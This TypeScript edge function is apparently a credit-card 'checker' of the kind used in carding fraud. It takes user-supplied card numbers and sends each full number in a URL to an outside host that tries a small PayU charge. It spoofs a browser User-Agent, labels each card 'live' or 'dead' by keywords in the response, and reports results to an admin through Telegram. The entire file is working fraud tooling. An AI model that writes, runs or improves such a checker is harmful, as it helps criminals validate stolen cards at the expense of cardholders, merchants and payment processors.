import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Max-Age": "86400",
};

// Helper function to send admin notification via Telegram
async function sendAdminTelegram(message: string) {
  const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
  const ADMIN_CHAT_ID = Deno.env.get("ADMIN_CHAT_ID");
  
  if (!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID) {
    console.log("Missing Telegram config, skipping admin notification");
    return;
  }
  
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: ADMIN_CHAT_ID,
        text: message,
        parse_mode: "HTML"
      })
    });
  } catch (e) {
    console.error("Failed to send admin Telegram:", e);
  }
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // REQUIRE AUTHENTICATION
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(
        JSON.stringify({ error: "Unauthorized" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // VERIFY USER TOKEN
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(
        JSON.stringify({ error: "Invalid token" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // CHECK USER IS NOT BANNED
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(
        JSON.stringify({ error: "Account suspended" }),
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const { cc, amount } = await req.json();

    if (!cc) {
      return new Response(
        JSON.stringify({ error: "Card details (cc) required" }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Default amount to 1 if not provided
    const chargeAmount = amount || 1;
    const maskedCC = cc.substring(0, 6) + '****' + cc.slice(-4);

    console.log(`PayU Check - User: ${user.id}, Amount: ₹${chargeAmount}, Card: ${maskedCC}`);

    // Call the PayU API
    const apiUrl = `https://payu.up.railway.app/${chargeAmount}/${cc}`;
    
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
    });

    const responseText = await response.text();
    console.log(`PayU Response: ${responseText}`);

    let data;
    try {
      data = JSON.parse(responseText);
    } catch {
      data = { raw: responseText };
    }

    // Determine status from response
    let status: "live" | "dead" | "unknown" = "unknown";
    let apiMessage = responseText;

    const lowerResponse = responseText.toLowerCase();
    
    // Check for failure indicators FIRST
    const hasFailureIndicators = 
        lowerResponse.includes("3d") || 
        lowerResponse.includes("3ds") ||
        lowerResponse.includes("verification") ||
        lowerResponse.includes("verify") ||
        lowerResponse.includes("authenticate") ||
        lowerResponse.includes("otp") ||
        lowerResponse.includes("secure") ||
        lowerResponse.includes("redirect") ||
        lowerResponse.includes("declined") || 
        lowerResponse.includes("could not") ||
        lowerResponse.includes("transaction failed") ||
        lowerResponse.includes("invalid") ||
        lowerResponse.includes("insufficient") ||
        lowerResponse.includes("expired") ||
        lowerResponse.includes("rejected") ||
        lowerResponse.includes("failed\":true") ||
        lowerResponse.includes("error_code") ||
        lowerResponse.includes("try again");

    if (hasFailureIndicators) {
      status = "dead";
      if (data && typeof data === 'object' && data.transaction?.retryOptions?.details?.error_message) {
        apiMessage = data.transaction.retryOptions.details.error_message;
      } else if (data && typeof data === 'object' && data.transaction?.retryOptions?.details?.error_title) {
        apiMessage = data.transaction.retryOptions.details.error_title;
      }
    } else if (lowerResponse.includes("success") || 
        lowerResponse.includes("approved") || 
        lowerResponse.includes("charged") ||
        lowerResponse.includes("payment successful") ||
        lowerResponse.includes("transaction successful")) {
      status = "live";
    }

    // Try to extract message from JSON response
    if (data && typeof data === 'object') {
      if (data.message) apiMessage = data.message;
      else if (data.status) apiMessage = data.status;
      else if (data.result) apiMessage = data.result;
      else if (data.error) apiMessage = data.error;
    }

    // Send raw response to admin via Telegram (masked card)
    const prettyJson = JSON.stringify(data, null, 2);
    const adminMessage = `🔍 <b>PayU API Raw Response</b>

💳 <b>Card:</b> <code>${maskedCC}</code>
💰 <b>Amount:</b> ₹${chargeAmount}
📊 <b>Status:</b> ${status.toUpperCase()}

📦 <b>Raw Response:</b>
<pre>${prettyJson.substring(0, 3500)}</pre>`;

    await sendAdminTelegram(adminMessage);

    return new Response(
      JSON.stringify({
        status,
        apiStatus: status.toUpperCase(),
        apiMessage,
        rawResponse: responseText,
        amount: chargeAmount
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : "Failed to process request";
    console.error('PayU Check Error:', errorMessage);
    
    await sendAdminTelegram(`❌ <b>PayU API Error</b>\n\n<code>${errorMessage}</code>`);
    
    return new Response(
      JSON.stringify({
        status: "unknown",
        apiStatus: "ERROR",
        apiMessage: errorMessage,
        rawResponse: errorMessage
      }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});